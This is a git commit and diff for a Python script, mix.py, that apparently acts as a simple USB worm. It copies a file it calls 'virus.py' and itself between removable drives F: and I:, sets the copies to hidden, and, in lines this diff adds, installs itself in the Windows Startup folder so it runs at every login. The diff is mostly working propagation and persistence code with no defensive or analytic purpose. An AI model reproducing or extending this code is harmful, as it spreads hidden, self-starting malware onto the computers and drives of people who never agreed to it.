7563a16e4c08a30d64feaffe4d0124ae33903831
Nasser <hizenbergabc@gmail.com>
2019-12-06 00:04:28 +0330

    add new code for cp mix from usb to startup windows

--- mix.py
+++ mix.py
@@ -6,26 +6,42 @@ import os
 user = os.getlogin()
 timer = 0
 while True:
-    time.sleep(5)
+    time.sleep(3)
     pwd = os.getcwd()
-    if pwd == 'F:\\':
+    if pwd == 'F:\\': #1
         timer +=1
         try:
             cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
             cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
+            print('run 1')
         except:
+            print('error 1')
             pass
         ctypes.windll.kernel32.SetFileAttributesW('i:mix.py',2) # it's for select the permision (hidden)
         ctypes.windll.kernel32.SetFileAttributesW('i:virus.py',2)
-        print('number of ruinig is >>',timer)
-    elif pwd == 'I:\\':
+        print('hidden execute')
+    elif pwd == 'I:\\':   #2
         timer +=2
         try:
-            cp_virus = shutil.copy('virus.py','f:')
-            cp_mix = shutil.copy('mix.py','f:')
-            cp_mix2 = shutil.copy('mix.py','c:Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs'%user)
+            #cp_virus = shutil.copy('virus.py','f:')
+            #cp_mix = shutil.copy('mix.py','f:')
+            cp_mix2 = shutil.copy('mix.py','C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'% user)
+            print('run 2')
         except:
+            print('error 2')
             pass
+
+     #3   
+    elif pwd == ('C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\'% user):
+        timer +=4
+        try:
+            cp_virus = shutil.copy('virus.py','i:')# it's for copy virus to flash
+            cp_mix = shutil.copy('mix.py','i:') #it's for copy mix to flash
+            print('run 3')
+        except:
+            print('error 3')
+            pass
+
     else:
         print('error x400')
-    print('...>> ',timer)
+        print('...>> ',timer)
